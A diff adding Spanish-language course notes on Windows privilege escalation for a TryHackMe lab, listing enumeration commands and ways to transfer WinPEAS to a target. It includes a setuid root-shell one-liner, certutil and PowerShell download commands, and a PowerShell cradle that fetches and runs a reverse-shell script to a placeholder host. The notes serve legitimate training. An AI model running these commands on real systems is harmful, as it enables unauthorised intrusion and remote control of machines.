@@ -988,3 +988,42 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 ## Nota Final
 Revisa los últimos 30 minutos de la clase para consolidar conceptos clave. Asegúrate de practicar cada uno de estos métodos en un entorno controlado y ético.
+
+# Notas de la Clase (23-01-2025)
+
+hacer la room de tryhackme de [https://tryhackme.com/r/room/windows10privesc](url)
+
+hostname
+whoami
+whoami /priv
+syteminfo
+ipconfig
+cmdkey /list
+
+Icacls <ruta>
+
+sc query windefend
+
+sc queryex type=service
+
+netsh advfirewall firewall dump
+Get-AppLockerPolicy -Effective | select - ExpandProperty RuleCollections
+
+schtasks /query /fo LIST /v
+
+reg /query
+
+
+Descargamos Peass en nuestra kali, y nos dan estos comandos para hacer el ejercicio para pasar el archivo al windows atacado. 
+
+     Target Windows:
+         curl -O http://[IP]/recurso
+         certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
+         powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+         Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+         powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+         powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+         copy \\IP\recurso
+
+Nos explica el profesor winPeass su funcionamiento el windows ya que linux lo sabemos.
+
